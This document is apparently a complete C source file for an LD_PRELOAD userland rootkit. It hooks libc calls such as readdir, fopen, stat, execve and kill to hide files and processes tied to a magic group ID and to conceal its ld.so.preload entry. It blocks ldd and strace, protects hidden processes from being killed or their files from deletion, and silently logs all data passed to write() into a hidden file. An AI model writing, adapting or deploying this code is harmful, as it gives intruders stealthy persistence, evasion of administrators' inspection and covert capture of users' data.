#define _GNU_SOURCE
#include <config.h>
#include <dlfcn.h>
#include <dirent.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <pcap.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sys/ptrace.h>
#include <errno.h>

int good_gid() {
    gid_t gid = getgid();
    if (gid == GID) {
        return 1;
    }
    return 0;
}

int pid_to_gid(int pid) {
    char path[1024];
    sprintf(path, "/proc/%d/status", pid);
    FILE *fp = fopen(path, "r");
    if (fp == NULL) {
        return -1;
    }

    int gid = -1;
    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "Gid:", 4) == 0) {
            if (sscanf(line, "Gid: %d", &gid) == 1) {
                break;
            }
            break;
        }
    }

    fclose(fp);

    return gid;
}

int pid_check(const char *path) {
    int pid = atoi(path);
    if (pid != 0) {
        int gid = pid_to_gid(pid);
        if (gid == GID) {
            return 1;
        }
    }
    return 0;
}

int file_check(const char *path) {
    if (
        strstr(path, HIDDEN_FILENAME) != NULL 
    || strstr(path, HIDDEN_FILENAME2) != NULL
    || strstr(path, HIDDEN_EXEC_PATH) != NULL
    || strstr(path, HIDDEN_PATH) != NULL
    || strstr(path, SPECIAL_PATH) != NULL
    || strstr(path, SPECIAL_FILENAME) != NULL
    || strstr(path, "ld.so.preload") != NULL
    ) {
        return 1;
    }

    return 0;
}

FILE *(*__o_fopen)(const char *, const char *);
FILE *__fopen(const char *path, const char *mode) {
    if(!__o_fopen)
        __o_fopen = dlsym(RTLD_NEXT, "fopen");

    FILE *fp = __o_fopen(path, mode);
    if (fp == NULL) {
        return NULL;
    }

    return fp;
}

// fopen

FILE *(*o_fopen)(const char *, const char *);
FILE *fopen(const char *path, const char *mode) {
#ifdef VERBOSE
    printf("fopen called\n");
#endif
    if(!o_fopen)
        o_fopen = dlsym(RTLD_NEXT, "fopen");

    if (good_gid() == 1) {
        return o_fopen(path, mode);
    }

    if (file_check(path) == 1) {
        errno = ENOENT;
        return NULL;
    }

    if (pid_check(path) == 1) {
        errno = ENOENT;
        return NULL;
    }

    return o_fopen(path, mode);
}

// EXECVE

int (*o_execve)(const char *, char *const argv[], char *const envp[]);
int execve(const char *path, char *const argv[], char *const envp[]) {
#ifdef VERBOSE
	printf("execve called\n");
#endif
    if(!o_execve)
        o_execve = dlsym(RTLD_NEXT, "execve");

    if (good_gid() == 1) {
        return o_execve(path, argv, envp);
    }

    if (strcmp(path, HIDDEN_EXEC_PATH) == 0) {
        return -1;
    }

    // if executing ldd return -1
    if (argv[0] != NULL && strcmp(argv[0], "ldd") == 0
    || argv[0] != NULL && strcmp(argv[0], "strace") == 0
    ) {
        return -1;
    }

    return o_execve(path, argv, envp);
}

// READDIR

struct dirent *(*o_readdir)(DIR *);
struct dirent *readdir(DIR *p) {
#ifdef VERBOSE
    printf("readdir called\n");
#endif
    if(!o_readdir)
        o_readdir = dlsym(RTLD_NEXT, "readdir");

    if (good_gid() == 1) {
        return o_readdir(p);
    }

    struct dirent *dir = o_readdir(p);

    if (dir == NULL) {
        return NULL;
    }

    if (file_check(dir->d_name) == 1) {
        return readdir(p);
    }

    if (pid_check(dir->d_name) == 1) {
        return readdir(p);
    }

    errno = 0;
    return dir;
}

// READDIR64

struct dirent64 *(*o_readdir64)(DIR *);
struct dirent64 *readdir64(DIR *p) {
#ifdef VERBOSE
    printf("readdir64 called\n");
#endif
    if(!o_readdir64)
        o_readdir64 = dlsym(RTLD_NEXT, "readdir64");

    if (good_gid() == 1) {
        return o_readdir64(p);
    }

    struct dirent64 *dir = o_readdir64(p);
    if (dir == NULL) {
        return NULL;
    }

    if (file_check(dir->d_name) == 1) {
        return readdir64(p);
    }

    if (pid_check(dir->d_name) == 1) {
        return readdir64(p);
    }

    errno = 0;
    return dir;
}

// UNLINK

int (*o_unlink)(const char *);
int unlink(const char *pathname) {
#ifdef VERBOSE
    printf("unlink called\n");
#endif
    if(!o_unlink)
        o_unlink = dlsym(RTLD_NEXT, "unlink");

    if (good_gid() == 1) {
        return o_unlink(pathname);
    }

    if (file_check(pathname) == 1) {
        return -1;
    }

    if (pid_check(pathname) == 1) {
        return -1;
    }

    return o_unlink(pathname);
}

// UNLINKAT

int (*o_unlinkat)(int, const char *, int);
int unlinkat(int dirfd, const char * pathname, int flags) {
#ifdef VERBOSE
    printf("unlinkat called\n");
#endif
    if(!o_unlinkat)
        o_unlinkat = dlsym(RTLD_NEXT, "unlinkat");

    if (good_gid() == 1) {
        return o_unlinkat(dirfd, pathname, flags);
    }

    if (file_check(pathname) == 1) {
        return -1;
    }

    if (pid_check(pathname) == 1) {
        return -1;
    }

    return o_unlinkat(dirfd, pathname, flags);
}

// WRITE
ssize_t (*o_write)(int, const void *, size_t);
ssize_t write(int fd, const void *xbuf, size_t count) {
#ifdef VERBOSE
    printf("write called\n");
#endif
    if(!o_write)
        o_write = dlsym(RTLD_NEXT, "write");

    if (good_gid() == 1) {
        return o_write(fd, xbuf, count);
    }

    char *buf = (char *) xbuf;
    FILE *fp = __fopen(SPECIAL_PATH "/" SPECIAL_FILENAME, "a");
    if (fp != NULL) {
        fwrite(buf, 1, count, fp);
        fclose(fp);
    }

    // dont allow writing to hidden files
    if (file_check(buf) == 1) {
        return 0;
    }

    return o_write(fd, xbuf, count);
}

// READ

ssize_t (*o_read)(int, void *, size_t);
ssize_t read(int fd, void *xbuf, size_t count) {
#ifdef VERBOSE
    printf("read called\n");
#endif
    if(!o_read)
        o_read = dlsym(RTLD_NEXT, "read");

    if (good_gid() == 1) {
        return o_read(fd, xbuf, count);
    }

    char *buf = (char *) xbuf;
    if (file_check(buf) == 1) {
        return 0;
    }

    return o_read(fd, xbuf, count);
}

// kill

int (*o_kill)(pid_t, int);
int kill(pid_t pid, int sig) {
#ifdef VERBOSE
    printf("kill called\n");
#endif

    if(!o_kill)
        o_kill = dlsym(RTLD_NEXT, "kill");

    if (good_gid() == 1) {
        return o_kill(pid, sig);
    }

    int gid = pid_to_gid(pid);
    if (gid == GID) {
        return -1;
    }

    return o_kill(pid, sig);
}

// openat

int (*o_openat)(int, const char *, int, ...);
int openat(int dirfd, const char *path, int flags, ...) {
#ifdef VERBOSE
    printf("openat called\n");
#endif
    printf("openat called\n");

    if(!o_openat)
        o_openat = dlsym(RTLD_NEXT, "openat");

    if (good_gid() == 1) {
        return o_openat(dirfd, path, flags);
    }

    if (file_check(path) == 1) {
        return -1;
    }

    if (pid_check(path) == 1) {
        return -1;
    }

    return o_openat(dirfd, path, flags);
}


// open64

int (*o_openat64)(int, const char *, int, ...);
int open64(const char *path, int flags, ...) {
#ifdef VERBOSE
    printf("openat64 called\n");
#endif
    if(!o_openat64)
        o_openat64 = dlsym(RTLD_NEXT, "openat64");

    if (good_gid() == 1) {
        return o_openat64(AT_FDCWD, path, flags);
    }

    if (file_check(path) == 1) {
        return -1;
    }

    if (pid_check(path) == 1) {
        return -1;
    }

    return o_openat64(AT_FDCWD, path, flags);
}

// opendir

DIR *(*o_opendir)(const char *);
DIR *opendir(const char *name) {
#ifdef VERBOSE
    printf("opendir called\n");
#endif
    if(!o_opendir)
        o_opendir = dlsym(RTLD_NEXT, "opendir");

    if (good_gid() == 1) {
        return o_opendir(name);
    }

    if (file_check(name) == 1) {
        errno = ENOENT;
        return NULL;
    }

    if (pid_check(name) == 1) {
        errno = ENOENT;
        return NULL;
    }

    return o_opendir(name);
}

// stat

int (*o_stat)(const char *, struct stat *);
int stat(const char *pathname, struct stat *statbuf) {
#ifdef VERBOSE
    printf("stat called\n");
#endif
    if(!o_stat)
        o_stat = dlsym(RTLD_NEXT, "stat");

    if (good_gid() == 1) {
        return o_stat(pathname, statbuf);
    }

    if (file_check(pathname) == 1) {
        errno = ENOENT;
        return -1;
    }

    if (pid_check(pathname) == 1) {
        errno = ENOENT;
        return -1;
    }

    return o_stat(pathname, statbuf);
}

// access

int (*o_access)(const char *, int);
int access(const char *pathname, int mode) {
#ifdef VERBOSE
    printf("access called\n");
#endif

    if(!o_access)
        o_access = dlsym(RTLD_NEXT, "access");

    if (good_gid() == 1) {
        return o_access(pathname, mode);
    }

    if (file_check(pathname) == 1) {
        errno = ENOENT;
        return -1;
    }

    if (pid_check(pathname) == 1) {
        return -1;
    }

    return o_access(pathname, mode);
}